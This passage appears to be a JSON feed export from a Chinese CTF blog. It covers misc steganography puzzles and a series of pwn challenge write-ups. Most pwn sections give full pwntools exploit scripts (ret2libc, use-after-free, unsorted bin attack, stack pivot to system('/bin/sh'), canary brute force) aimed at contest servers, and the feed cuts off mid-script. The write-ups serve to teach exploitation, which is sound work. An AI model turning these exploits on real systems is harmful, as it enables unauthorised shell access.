class=\"string\">&#x27;Ys&gt;UEJht#?ppeEFtstR#~:hi~tR:@s@YRteK#e@KsR&amp;E&amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;&amp;::EsEEei#/iYe#/ieKKt//iKYhh&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(Counter(f))</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a570599.png\" alt=\"请添加图片描述\" /></p>\n<p>得到： <code>theKEYis:#R@/&amp;p~!&gt;UJ?FC2HVj(S$</code> <br />\n 初步尝试，发现这个不太对，密码错误。。。<br />\n瞻仰一波套神的 wp 之后，原来  <code>&gt;UJ?FC2HVj(S$</code>  词频为 1，所以顺序可能出错，推测词频为 1 的部分不是密码，<br />\n所以得到密码：</p>\n<blockquote>\n<p>'#R@/&amp;p~!'</p>\n</blockquote>\n<p>解压得到 flag.txt....\t(T_T)<br />\n 果然我还是太天真了，还以为能直接拿到 flag...<br />\n 瞅瞅内码，然后看到了这个：</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a60a7f6.png\" alt=\"请添加图片描述\" /></p>\n<p>哦吼，还有个零宽？<br />\n包含 U+200C U+200D U+200E，<span class=\"exturl\" data-url=\"aHR0cHM6Ly8zMzBrLmdpdGh1Yi5pby9taXNjX3Rvb2xzL3VuaWNvZGVfc3RlZ2Fub2dyYXBoeS5odG1s\">网址</span><br />\n隐藏内容是：</p>\n<blockquote>\n<p>2021 年 4 月 13 日，核废水在 Citrix 县的 CTX1 市尤为严重</p>\n</blockquote>\n<p>好吧，完全不知道....(；′⌒`)<br />\n 搜了一下 Citrix CTX1，大概是某种加密，<br />\n终归还是了解的太少了<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a6921a9.png\" alt=\"请添加图片描述\" /></p>\n<p>emm... 搜索发现 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">CyberChef</span> 可以进行解密\t§(<em>￣▽￣</em>)§<br />\n 解两次得到 flag：</p>\n<blockquote 98047de9ce5aaa4c0031fb55e9dfac70=\"\">\n<p>flag</p>\n</blockquote>\n<hr />\n<p>到这里，misc 就结束啦！ (oﾟvﾟ) ノ</p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/",
            "title": "CUMT PWN专项",
            "date_published": "2021-11-25T15:24:22.000Z",
            "content_html": "<h2 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h2>\n<p>都说了是测试 nc 了，连上就直接可以拿到 flag</p>\n<h2 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h2>\n<p>给我们个 password，你再传回去就完了<br />\n关键是要仔细读题，看仔细到底哪些是 password<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">6666</span> )</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recvuntil(<span class=\"string\">b&#x27;*\\n&#x27;</span>).decode())</span><br><span class=\"line\">p=r.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(p))</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">bytes</span>(p))</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h2>\n<p>ret2libc<br />\n 泄露 libc 中 puts 函数的地址<br />\n传入 puts_got，得到 puts 的运行时的地址，<br />\n用 libc.symbols [“system”] - libc.symbols [“puts”] 得到 system 和 puts 的距离，<br />\n加上之前接收的 puts 运行时的地址，得到 system 运行的地址，<br />\n然后直接用 elf.search ('sh\\x00').<strong>next</strong> () 找到 sh 的地址<br />\n没开 canary，<br />\n0x38, 所以 payload 填 60 个 a, 然后传 system 地址 + sh 地址，就可以 getshell 了<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(b&#x27;./pwn3&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;219.219.61.234&#x27;</span>,<span class=\"number\">10003</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">b&#x27;./pwn3&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">b&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recv().decode())</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\">r.send(<span class=\"built_in\">str</span>(puts_got).encode())</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27; : &#x27;</span>)</span><br><span class=\"line\">puts_addr = <span class=\"built_in\">int</span>(r.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = puts_addr + libc.symbols[<span class=\"string\">&quot;system&quot;</span>] - libc.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">60</span> + p32(system_addr) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(elf.search(<span class=\"string\">b&#x27;sh\\x00&#x27;</span>).__next__())</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27; :&#x27;</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h2>\n<p>没开 canary，但是前两个地方不能栈溢出，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436075/Typera/2023/04/dc2c87519810519185f4e3c91622b01d.png\" alt=\"image-20230425232110426\" /><br />\n 而又观察到 v3 刚好是个 unsigned int8 型的变量，可以利用整数溢出的漏洞，<br />\n它的最大值位 255，所以只要保证一共填了 255+4 ~ +8 之间的个数就行</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn4&#x27;)</span></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">10004</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span> + p32(backdoor) + <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">259</span>-<span class=\"number\">0x18</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;choice:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;username:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;123&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;passwd:&#x27;</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn5\"><a class=\"anchor\" href=\"#pwn5\">#</a> pwn5</h2>\n<p>Use After Free 漏洞<br />\n指针 free 之后没有置空，下次在访问该指针时能访问到原指针所指向的堆内容<br />\n添加两个 note 之后，依次释放。再创建大小为 8 的 note 时，内容部分对应被分配到第一个 note 里面，而它的指针没有置空，<br />\n所以如果我们在新的 note 里面放后门函数的地址的话，print 新 note 的内容的时候，就会执行这个后门函数<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(b&#x27;./pwn5&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;219.219.61.234&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(backdoor))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn6\"><a class=\"anchor\" href=\"#pwn6\">#</a> pwn6</h2>\n<p>堆溢出漏洞 + unsorted bin attack<br />\n 只要控制 v3=4869，同时控制 qword_6020C0 大于 0x1305，就可以了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436089/Typera/2023/04/d1aaf56f4760a578927720faa790c02a.png\" alt=\"image-20230425232125920\" /><br />\n 观察到 v3=2 对应的函数里面有堆溢出漏洞，所以可以利用堆溢出漏洞修改堆块的 bk 指针为 qword_6020C0 的地址 - 16</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn6&#x27;)</span></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">10001</span> )</span><br><span class=\"line\">elf=ELF(<span class=\"string\">B&#x27;./pwn6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;cccc&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x6020C0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = magic -<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk)) </span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;4869&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/",
            "title": "CUMTCTF 2021国庆赛WP（部分）",
            "date_published": "2021-11-22T15:44:13.000Z",
            "content_html": "<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h3>\n<p>nc 连上 直接 cat flag</p>\n<h3 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h3>\n<p>经典栈溢出<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435298/Typera/2023/04/2d25d53292a7b5602fd11b9e1127bcf1.png\" alt=\"image-20230425230815230\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(&quot;./pwn2&quot;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">72</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>直接传就行了...</p>\n<h3 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h3>\n<p>开了 NX 保护，没开金丝雀</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435393/Typera/2023/04/0ac847eebeec27d62e811700f99b5b71.png\" alt=\"image-20230425230949625\" /> 有个 echo flag，感觉像是那么回事，实际上没用，</p>\n<p>所以还是得通过 system 函数来搞</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435314/Typera/2023/04/b3a274b13eede296b71c54165bc95d53.png\" alt=\"image-20230425230831039\" /></p>\n<p>这里 s 大小是 0x28，所以只能溢出 0x8 字节，不够写太长的，但是这里可以读两次，所以思路是第一次泄露 ebp 地址，第二次写入 system (‘/bin/sh’)，然后用 leave;ret 栈劫持 s，执行 system ('/bin/sh')</p>\n<p>要劫持 s 要知道 s 的地址，可以通过动调知道 ebp 到 s 的距离，然后计算</p>\n<p>ebp 到 s 的距离为 0xffffc1f8 - 0xffffc1c0 = 0x38</p>\n<p>所以 ebp:</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x27</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">r.send(p)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">ebp = u32(r.recv(<span class=\"number\">4</span>))</span><br></pre></td></tr></table></figure></p>\n<p>可以得到 ebp 的地址，然后 - 0x38 得到 s</p>\n<p>完整 exp:</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn3&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;1.15.81.218&#x27;,10002)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x08048562</span></span><br><span class=\"line\">main_addr=<span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x27</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">r.send(p)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">s_addr=ebp=u32(r.recv(<span class=\"number\">4</span>))-<span class=\"number\">0x38</span>  <span class=\"comment\"># ebp-s=0x38</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p2=<span class=\"string\">b&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(main_addr)+p32(s_addr+<span class=\"number\">0x10</span>)+<span class=\"string\">b&quot;/bin/sh&quot;</span></span><br><span class=\"line\">p2=p2.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)  <span class=\"comment\"># /bin/sh添上\\x00</span></span><br><span class=\"line\">p2+=p32(s_addr)+p32(leave_ret)  <span class=\"comment\"># hijack s</span></span><br><span class=\"line\">r.send(p2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"brute\"><a class=\"anchor\" href=\"#brute\">#</a> brute?</h3>\n<p>brute canary, 暴力破解金丝雀<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./brute&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">20000</span>)</span><br><span class=\"line\">canary = <span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary,r</span><br><span class=\"line\">    <span class=\"comment\">#r = process(&#x27;./brute&#x27;)</span></span><br><span class=\"line\">    r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">20000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(r.recvuntil(<span class=\"string\">b&#x27;2021!\\n&#x27;</span>))</span><br><span class=\"line\">    canary = <span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x100</span>):</span><br><span class=\"line\">            r.send(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i).encode()))</span><br><span class=\"line\">            a = r.recvuntil(<span class=\"string\">b&#x27;2021!\\n&#x27;</span>)</span><br><span class=\"line\">            <span 